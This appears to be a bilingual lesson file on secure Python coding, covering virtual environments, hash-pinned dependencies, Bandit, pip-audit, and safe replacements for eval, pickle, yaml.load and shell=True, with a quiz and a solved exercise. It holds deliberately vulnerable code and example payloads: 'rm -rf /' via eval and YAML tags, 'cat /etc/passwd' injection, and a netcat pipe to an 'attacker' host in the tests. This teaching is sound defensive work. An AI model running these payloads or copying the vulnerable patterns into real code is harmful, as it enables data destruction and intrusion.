@@ -1,0 +1,480 @@
+description:
+  fr: "Écrire du code Python sûr : environnements virtuels, dépendances épinglées avec empreintes, tests pytest, analyse Bandit, pip-audit, et fonctions dangereuses (eval, pickle, yaml.load, subprocess shell=True)."
+  en: "Write safe Python code: virtual environments, pinned dependencies with hashes, pytest tests, Bandit analysis, pip-audit, and dangerous functions (eval, pickle, yaml.load, subprocess shell=True)."
+duration: 40
+
+intro:
+  fr: |
+    Python est agréable à écrire, mais plusieurs de ses fonctions sont de véritables **portes dérobées** si
+    on les nourrit avec une entrée non maîtrisée : `eval`, `pickle`, `yaml.load` ou `subprocess` avec
+    `shell=True` peuvent exécuter du code arbitraire. S'ajoutent les risques de la **chaîne
+    d'approvisionnement** : une dépendance vérolée ou une version avec une faille connue.
+
+    C'est comme une cuisine professionnelle : les couteaux et le feu sont indispensables, mais une mauvaise
+    manipulation blesse. On ne supprime pas les outils, on apprend les gestes sûrs et on met en place des
+    garde-fous automatiques (hotte, extincteur, contrôle d'hygiène).
+
+    Vous allez mettre en place l'« hygiène » d'un projet Python professionnel : un **environnement virtuel**,
+    des **dépendances épinglées avec empreintes**, des **tests** `pytest`, et deux outils de sécurité,
+    **Bandit** (analyse du code) et **pip-audit** (failles des dépendances). Puis vous verrez la version sûre
+    de chaque fonction dangereuse.
+  en: |
+    Python is pleasant to write, but several of its functions are true **backdoors** if fed with untrusted
+    input: `eval`, `pickle`, `yaml.load` or `subprocess` with `shell=True` can execute arbitrary code. On top
+    of that come **supply-chain** risks: a tampered dependency or a version with a known flaw.
+
+    It is like a professional kitchen: knives and fire are essential, but careless handling causes injury.
+    You do not remove the tools, you learn the safe gestures and set up automatic safeguards (hood, fire
+    extinguisher, hygiene inspection).
+
+    You will set up the "hygiene" of a professional Python project: a **virtual environment**, **pinned
+    dependencies with hashes**, `pytest` **tests**, and two security tools, **Bandit** (code analysis) and
+    **pip-audit** (dependency flaws). Then you will see the safe version of each dangerous function.
+
+sections:
+  - heading:
+      fr: "venv, dépendances épinglées et empreintes"
+      en: "venv, pinned dependencies and hashes"
+    body:
+      fr: |
+        Un **environnement virtuel** (`python -m venv .venv`) isole les dépendances d'un projet des autres
+        projets et du système. Sans lui, deux projets qui demandent deux versions d'une même bibliothèque
+        entrent en conflit, et une installation globale peut tout casser.
+
+        **Épingler** les dépendances, c'est figer la version exacte de chacune dans un `requirements.txt` :
+        `requests==2.32.3`, pas `requests` ni `requests>=2`. Sinon, un `pip install` demain peut récupérer
+        une version différente — et peut-être une version compromise. Encore mieux : ajouter l'**empreinte**
+        (`--hash=sha256:...`) de chaque paquet. `pip install --require-hashes` refuse alors d'installer quoi
+        que ce soit dont le contenu ne correspond pas à l'empreinte attendue : c'est la défense contre une
+        attaque de la chaîne d'approvisionnement.
+
+        | Forme dans requirements.txt | Reproductible ? | Résiste à un paquet modifié ? |
+        |---|---|---|
+        | `requests` | Non | Non |
+        | `requests>=2.0` | Non | Non |
+        | `requests==2.32.3` | Oui | Non |
+        | `requests==2.32.3 --hash=sha256:...` | Oui | **Oui** |
+
+        Enfin, `pip install --no-deps` et surtout l'option d'épingler aussi les dépendances transitives
+        (via `pip-compile` de *pip-tools*) rendent l'installation totalement déterministe.
+      en: |
+        A **virtual environment** (`python -m venv .venv`) isolates a project's dependencies from other
+        projects and from the system. Without it, two projects that need two versions of the same library
+        clash, and a global install can break everything.
+
+        To **pin** dependencies is to freeze each one's exact version in a `requirements.txt`:
+        `requests==2.32.3`, not `requests` nor `requests>=2`. Otherwise a `pip install` tomorrow may fetch a
+        different — perhaps compromised — version. Better still: add each package's **hash**
+        (`--hash=sha256:...`). `pip install --require-hashes` then refuses to install anything whose contents
+        do not match the expected hash: this is the defence against a supply-chain attack.
+
+        | Form in requirements.txt | Reproducible? | Resists a tampered package? |
+        |---|---|---|
+        | `requests` | No | No |
+        | `requests>=2.0` | No | No |
+        | `requests==2.32.3` | Yes | No |
+        | `requests==2.32.3 --hash=sha256:...` | Yes | **Yes** |
+
+        Finally, `pip install --no-deps` and above all pinning transitive dependencies too (via `pip-compile`
+        from *pip-tools*) make the install fully deterministic.
+  - heading:
+      fr: "Bandit, pip-audit et les fonctions dangereuses"
+      en: "Bandit, pip-audit and the dangerous functions"
+    body:
+      fr: |
+        Deux outils complémentaires forment la base de la sécurité d'un projet Python :
+
+        - **Bandit** analyse votre **code** à la recherche de patrons dangereux : `eval`, `pickle`,
+          `yaml.load`, `subprocess(shell=True)`, mots de passe en dur, `assert` en production… Chaque alerte
+          porte un identifiant (`B602`, `B301`…).
+        - **pip-audit** compare vos **dépendances** à la base officielle des vulnérabilités Python (PyPA
+          Advisory Database) et signale les versions à mettre à jour.
+
+        Les fonctions à surveiller, et leur alternative sûre :
+
+        | Fonction dangereuse | Risque | Alternative sûre |
+        |---|---|---|
+        | `eval(x)` / `exec(x)` | Exécution de code arbitraire | `ast.literal_eval`, un vrai parseur |
+        | `pickle.loads(x)` | Exécution de code à la désérialisation | `json.loads`, un format sans code |
+        | `yaml.load(x)` | Exécution de code via `!!python/object` | `yaml.safe_load` |
+        | `subprocess.run(cmd, shell=True)` | Injection de commande | liste d'arguments, `shell=False` |
+
+        Le point commun : ces fonctions **interprètent** leur entrée (comme du code, un objet ou une commande
+        shell). La règle est simple — ne jamais leur donner une donnée qui vient d'un utilisateur, d'un
+        fichier téléchargé ou du réseau.
+      en: |
+        Two complementary tools form the base of a Python project's security:
+
+        - **Bandit** scans your **code** for dangerous patterns: `eval`, `pickle`, `yaml.load`,
+          `subprocess(shell=True)`, hard-coded passwords, `assert` in production… Each alert has an id
+          (`B602`, `B301`…).
+        - **pip-audit** compares your **dependencies** against the official Python vulnerability database
+          (PyPA Advisory Database) and flags versions to update.
+
+        The functions to watch, and their safe alternative:
+
+        | Dangerous function | Risk | Safe alternative |
+        |---|---|---|
+        | `eval(x)` / `exec(x)` | Arbitrary code execution | `ast.literal_eval`, a real parser |
+        | `pickle.loads(x)` | Code execution on deserialization | `json.loads`, a code-free format |
+        | `yaml.load(x)` | Code execution via `!!python/object` | `yaml.safe_load` |
+        | `subprocess.run(cmd, shell=True)` | Command injection | argument list, `shell=False` |
+
+        The common thread: these functions **interpret** their input (as code, an object or a shell command).
+        The rule is simple — never hand them data that comes from a user, a downloaded file or the network.
+
+examples:
+  - title:
+      fr: "Quatre fonctions dangereuses nourries par une entrée non maîtrisée"
+      en: "Four dangerous functions fed with untrusted input"
+    file: dangerous.py
+    lang: python
+    kind: vulnerable
+    code: |
+      import pickle
+      import subprocess
+      import yaml
+
+      # 1. eval executes whatever string it receives
+      def compute(expr):
+          return eval(expr)  # eval("__import__('os').system('rm -rf /')") -> runs it
+
+      # 2. pickle runs __reduce__ while loading: a crafted blob executes code
+      def load_profile(blob):
+          return pickle.loads(blob)
+
+      # 3. yaml.load with the default loader can build arbitrary Python objects
+      def load_config(text):
+          return yaml.load(text, Loader=yaml.Loader)
+
+      # 4. shell=True lets the input break out of the command (command injection)
+      def ping(host):
+          return subprocess.run(f"ping -c1 {host}", shell=True, capture_output=True)
+
+      if __name__ == "__main__":
+          # These inputs would normally come from a user, a file or the network
+          ping("example.com; cat /etc/passwd")  # the ; starts a second command
+    output: |
+      $ bandit -r dangerous.py
+      >> Issue: [B307:blacklist] Use of possibly insecure function - consider using safer ast.literal_eval.
+         Severity: Medium   Location: dangerous.py:6
+      >> Issue: [B301:blacklist] Pickle library appears to be in use with untrusted data.
+         Severity: Medium   Location: dangerous.py:10
+      >> Issue: [B506:yaml_load] Use of unsafe yaml load. Allows instantiation of arbitrary objects.
+         Severity: Medium   Location: dangerous.py:14
+      >> Issue: [B602:subprocess_popen_with_shell_equals_true] subprocess call with shell=True identified.
+         Severity: High     Location: dangerous.py:18
+      Code scanned: ... Issues: 4
+    note:
+      fr: "Les quatre fonctions **interprètent** leur entrée. Avec `shell=True`, le `;` dans `host` lance une deuxième commande : c'est une injection de commande. Bandit détecte les quatre patrons par analyse statique, sans exécuter le code."
+      en: "All four functions **interpret** their input. With `shell=True`, the `;` in `host` launches a second command: that is command injection. Bandit detects all four patterns through static analysis, without running the code."
+
+  - title:
+      fr: "Les mêmes besoins, écrits de façon sûre"
+      en: "The same needs, written safely"
+    file: safe.py
+    lang: python
+    kind: secure
+    code: |
+      import ast
+      import json
+      import subprocess
+      import yaml
+
+      # 1. ast.literal_eval only parses literals (numbers, lists, dicts): no code runs
+      def compute_literal(expr):
+          return ast.literal_eval(expr)  # "2 + 2" raises; "[1, 2, 3]" is fine
+
+      # 2. JSON carries data only, never code
+      def load_profile(text):
+          return json.loads(text)
+
+      # 3. safe_load refuses the !!python/object tags that build arbitrary objects
+      def load_config(text):
+          return yaml.safe_load(text)
+
+      # 4. No shell: the host is a separate argument and cannot inject a command
+      def ping(host):
+          # Validate first, then pass as a list with shell=False (the default)
+          if not all(c.isalnum() or c in ".-" for c in host):
+              raise ValueError("invalid host")
+          return subprocess.run(["ping", "-c1", "--", host], capture_output=True)
+
+      if __name__ == "__main__":
+          print(compute_literal("[1, 2, 3]"))
+          print(load_config("name: web\nport: 8080"))
+          try:
+              ping("example.com; cat /etc/passwd")  # rejected by validation
+          except ValueError as e:
+              print("blocked:", e)
+    output: |
+      [1, 2, 3]
+      {'name': 'web', 'port': 8080}
+      blocked: invalid host
+    note:
+      fr: "Chaque fonction a une alternative qui **ne peut pas exécuter de code** : `ast.literal_eval` ne lit que des littéraux, `json` ne porte que des données, `yaml.safe_load` interdit les objets Python, et la liste d'arguments sans shell rend l'injection impossible. La validation préalable rejette l'hôte malveillant."
+      en: "Each function has an alternative that **cannot execute code**: `ast.literal_eval` only reads literals, `json` only carries data, `yaml.safe_load` forbids Python objects, and the argument list with no shell makes injection impossible. Upfront validation rejects the malicious host."
+
+  - title:
+      fr: "Dépendances épinglées avec empreintes et installation vérifiée"
+      en: "Pinned dependencies with hashes and a verified install"
+    file: setup.sh
+    lang: bash
+    kind: secure
+    code: |
+      # Create and activate an isolated environment
+      python -m venv .venv
+      source .venv/bin/activate   # on Windows: .venv\Scripts\activate
+
+      # requirements.txt pins the exact version AND the hash of each package:
+      #
+      #   requests==2.32.3 \
+      #       --hash=sha256:70761cfe03c773ceb22aa2f671b4757976145175cdfca038c02654d061d6dcc6
+      #
+      # --require-hashes refuses to install anything whose content does not match
+      pip install --require-hashes -r requirements.txt
+
+      # Audit the installed dependencies against the PyPA vulnerability database
+      pip install pip-audit
+      pip-audit
+    output: |
+      Found 1 known vulnerability in 1 package
+      Name     Version  ID             Fix Versions
+      -------- -------- -------------- ------------
+      jinja2   3.1.3    GHSA-h5c8-rqwp 3.1.4
+      # exit code 1 -> the pipeline fails until jinja2 is upgraded to 3.1.4
+    note:
+      fr: "`--require-hashes` garantit que le paquet installé est **exactement** celui attendu : un miroir PyPI compromis ne peut pas glisser une version vérolée. `pip-audit` signale ensuite les failles connues et renvoie un code non nul, ce qui fait échouer la CI."
+      en: "`--require-hashes` guarantees the installed package is **exactly** the expected one: a compromised PyPI mirror cannot slip in a tampered version. `pip-audit` then flags known flaws and returns a non-zero code, which fails CI."
+
+  - title:
+      fr: "Tester la fonction de validation avec pytest"
+      en: "Testing the validation function with pytest"
+    file: test_safe.py
+    lang: python
+    kind: secure
+    code: |
+      import pytest
+      from safe import compute_literal, ping
+
+
+      def test_literal_eval_accepts_data():
+          assert compute_literal("[1, 2, 3]") == [1, 2, 3]
+          assert compute_literal("{'port': 8080}") == {"port": 8080}
+
+
+      def test_literal_eval_rejects_code():
+          # A function call is not a literal: it must raise, never execute
+          with pytest.raises(ValueError):
+              compute_literal("__import__('os').system('echo pwned')")
+
+
+      @pytest.mark.parametrize("bad_host", [
+          "example.com; cat /etc/passwd",
+          "$(reboot)",
+          "a | nc attacker 4444",
+      ])
+      def test_ping_rejects_injection(bad_host):
+          # Every injection attempt must be blocked before any subprocess runs
+          with pytest.raises(ValueError):
+              ping(bad_host)
+    output: |
+      $ pytest -q
+      .....                                                         [100%]
+      5 passed in 0.04s
+    note:
+      fr: "Les tests vérifient que la version sûre **accepte** les données légitimes et **rejette** les tentatives d'injection. `parametrize` rejoue le même test sur plusieurs charges malveillantes. Un test de sécurité qui échoue bloque la fusion, au même titre qu'un test fonctionnel."
+      en: "The tests check that the safe version **accepts** legitimate data and **rejects** injection attempts. `parametrize` replays the same test on several malicious payloads. A failing security test blocks the merge, just like a functional test."
+
+mistake:
+  fr: |
+    **Utiliser `yaml.load` (ou `pickle.loads`) sur des données que l'on ne contrôle pas.**
+
+    ```python
+    config = yaml.load(open("downloaded.yml"), Loader=yaml.Loader)  # can run code
+    ```
+
+    Avec le loader par défaut, un fichier YAML peut contenir `!!python/object/apply:os.system ["rm -rf /"]`
+    et exécuter la commande au simple chargement. Le code « marche » tant que les fichiers sont honnêtes,
+    mais un fichier fourni par un tiers devient une exécution de code à distance. La règle : `yaml.safe_load`
+    toujours, et jamais `pickle` sur une donnée externe (préférez JSON). Ces deux fonctions désérialisent en
+    **instanciant des objets Python**, ce qui revient à exécuter du code.
+  en: |
+    **Using `yaml.load` (or `pickle.loads`) on data you do not control.**
+
+    ```python
+    config = yaml.load(open("downloaded.yml"), Loader=yaml.Loader)  # can run code
+    ```
+
+    With the default loader, a YAML file can contain `!!python/object/apply:os.system ["rm -rf /"]` and run
+    the command on load alone. The code "works" as long as files are honest, but a file supplied by a third
+    party becomes remote code execution. The rule: `yaml.safe_load` always, and never `pickle` on external
+    data (prefer JSON). Both functions deserialize by **instantiating Python objects**, which amounts to
+    executing code.
+
+bestPractice:
+  fr: |
+    - **Un environnement virtuel par projet** (`python -m venv .venv`), jamais d'installation globale.
+    - **Épinglez les versions et les empreintes** dans `requirements.txt`, installez avec `--require-hashes`.
+    - **Bannissez les fonctions qui interprètent** une entrée externe : `eval`, `exec`, `pickle`, `yaml.load`, `shell=True`.
+    - **Validez puis passez une liste d'arguments** à `subprocess` (`shell=False`), jamais une chaîne.
+    - **Lancez Bandit et pip-audit en CI** et faites échouer le pipeline sur les alertes sévères.
+    - **Écrivez des tests de sécurité** avec `pytest` : vérifiez que les charges malveillantes sont rejetées.
+    - **Mettez à jour régulièrement** les dépendances ; une version épinglée doit quand même être suivie.
+  en: |
+    - **One virtual environment per project** (`python -m venv .venv`), never a global install.
+    - **Pin versions and hashes** in `requirements.txt`, install with `--require-hashes`.
+    - **Ban functions that interpret** external input: `eval`, `exec`, `pickle`, `yaml.load`, `shell=True`.
+    - **Validate then pass an argument list** to `subprocess` (`shell=False`), never a string.
+    - **Run Bandit and pip-audit in CI** and fail the pipeline on severe alerts.
+    - **Write security tests** with `pytest`: check that malicious payloads are rejected.
+    - **Update dependencies regularly**; a pinned version must still be tracked.
+
+exercise:
+  statement:
+    fr: |
+      Cette fonction lit un fichier de configuration et exécute une commande de sauvegarde. Elle contient
+      **deux** failles d'exécution de code.
+
+      ```python
+      import yaml, subprocess
+
+      def run_backup(config_text):
+          cfg = yaml.load(config_text, Loader=yaml.Loader)
+          target = cfg["target"]
+          subprocess.run(f"tar -czf backup.tgz {target}", shell=True)
+      ```
+
+      1. Identifiez les deux failles.
+      2. Réécrivez la fonction : chargement YAML sûr et appel `subprocess` sans shell, avec une liste
+         d'arguments.
+    en: |
+      This function reads a configuration file and runs a backup command. It contains **two** code-execution
+      flaws.
+
+      ```python
+      import yaml, subprocess
+
+      def run_backup(config_text):
+          cfg = yaml.load(config_text, Loader=yaml.Loader)
+          target = cfg["target"]
+          subprocess.run(f"tar -czf backup.tgz {target}", shell=True)
+      ```
+
+      1. Identify the two flaws.
+      2. Rewrite the function: safe YAML loading and a `subprocess` call with no shell, using an argument
+         list.
+  solution:
+    file: backup.py
+    lang: python
+    code: |
+      import subprocess
+      import yaml
+
+
+      def run_backup(config_text):
+          # 1. safe_load refuses !!python/object tags -> no code execution on load
+          cfg = yaml.safe_load(config_text)
+          target = cfg["target"]
+
+          if not isinstance(target, str) or not target:
+              raise ValueError("target must be a non-empty string")
+
+          # 2. Argument list, shell=False (default): "target" is just an argument,
+          #    it can never start a second command
+          subprocess.run(["tar", "-czf", "backup.tgz", "--", target], check=True)
+    note:
+      fr: "Faille 1 : `yaml.load` avec le loader par défaut (exécution de code via `!!python/object`). Faille 2 : `shell=True` avec une valeur interpolée (injection de commande). `yaml.safe_load`, la liste d'arguments et `--` (fin des options) corrigent les deux ; `check=True` fait remonter une erreur si `tar` échoue."
+      en: "Flaw 1: `yaml.load` with the default loader (code execution via `!!python/object`). Flaw 2: `shell=True` with an interpolated value (command injection). `yaml.safe_load`, the argument list and `--` (end of options) fix both; `check=True` surfaces an error if `tar` fails."
+
+quiz:
+  - q:
+      fr: "Quelle fonction remplace `yaml.load` de façon sûre ?"
+      en: "Which function safely replaces `yaml.load`?"
+    options:
+      fr:
+        - "`yaml.safe_load`"
+        - "`yaml.full_load`"
+        - "`yaml.load` avec `Loader=yaml.Loader`"
+        - "`pickle.loads`"
+      en:
+        - "`yaml.safe_load`"
+        - "`yaml.full_load`"
+        - "`yaml.load` with `Loader=yaml.Loader`"
+        - "`pickle.loads`"
+    answer: 0
+    why:
+      fr: "`yaml.safe_load` refuse les tags `!!python/object`, ce qui empêche l'instanciation d'objets Python arbitraires."
+      en: "`yaml.safe_load` refuses `!!python/object` tags, which prevents instantiating arbitrary Python objects."
+  - q:
+      fr: "Pourquoi `subprocess.run(cmd, shell=True)` avec une entrée utilisateur est-il dangereux ?"
+      en: "Why is `subprocess.run(cmd, shell=True)` with user input dangerous?"
+    options:
+      fr:
+        - "Parce que le shell est plus lent"
+        - "Parce que l'entrée peut injecter une seconde commande (via `;`, `|`, `$()`)"
+        - "Parce que `shell=True` ne fonctionne pas sous Windows"
+        - "Parce que la sortie n'est pas capturée"
+      en:
+        - "Because the shell is slower"
+        - "Because the input can inject a second command (via `;`, `|`, `$()`)"
+        - "Because `shell=True` does not work on Windows"
+        - "Because the output is not captured"
+    answer: 1
+    why:
+      fr: "Avec un shell, des métacaractères comme `;` dans l'entrée permettent d'exécuter des commandes supplémentaires : c'est l'injection de commande."
+      en: "With a shell, metacharacters like `;` in the input let extra commands run: this is command injection."
+  - q:
+      fr: "Que garantit `pip install --require-hashes` ?"
+      en: "What does `pip install --require-hashes` guarantee?"
+    options:
+      fr:
+        - "Que les paquets sont installés plus vite"
+        - "Que seules les dépendances directes sont installées"
+        - "Que le contenu de chaque paquet correspond exactement à l'empreinte attendue"
+        - "Que les paquets sont automatiquement mis à jour"
+      en:
+        - "That packages install faster"
+        - "That only direct dependencies are installed"
+        - "That each package's content exactly matches the expected hash"
+        - "That packages are updated automatically"
+    answer: 2
+    why:
+      fr: "pip refuse d'installer un paquet dont l'empreinte ne correspond pas, ce qui bloque une version compromise sur un miroir."
+      en: "pip refuses to install a package whose hash does not match, which blocks a tampered version on a mirror."
+  - q:
+      fr: "Quel outil analyse le code Python à la recherche de patrons dangereux comme `eval` ou `pickle` ?"
+      en: "Which tool scans Python code for dangerous patterns like `eval` or `pickle`?"
+    options:
+      fr:
+        - "pip-audit"
+        - "Bandit"
+        - "pytest"
+        - "venv"
+      en:
+        - "pip-audit"
+        - "Bandit"
+        - "pytest"
+        - "venv"
+    answer: 1
+    why:
+      fr: "Bandit est un SAST pour Python qui détecte ces fonctions dangereuses ; pip-audit, lui, cible les failles des dépendances."
+      en: "Bandit is a SAST for Python that detects these dangerous functions; pip-audit instead targets dependency flaws."
+  - q:
+      fr: "Pourquoi utiliser un environnement virtuel (`venv`) par projet ?"
+      en: "Why use a virtual environment (`venv`) per project?"
+    options:
+      fr:
+        - "Pour chiffrer le code source"
+        - "Pour compiler Python en binaire"
+        - "Pour accélérer l'interpréteur Python"
+        - "Pour isoler les dépendances et éviter les conflits de versions"
+      en:
+        - "To encrypt the source code"
+        - "To compile Python to a binary"
+        - "To speed up the Python interpreter"
+        - "To isolate dependencies and avoid version conflicts"
+    answer: 3
+    why:
+      fr: "Un venv isole les dépendances d'un projet des autres et du système, ce qui rend l'installation reproductible et évite les conflits."
+      en: "A venv isolates a project's dependencies from others and from the system, making the install reproducible and avoiding conflicts."
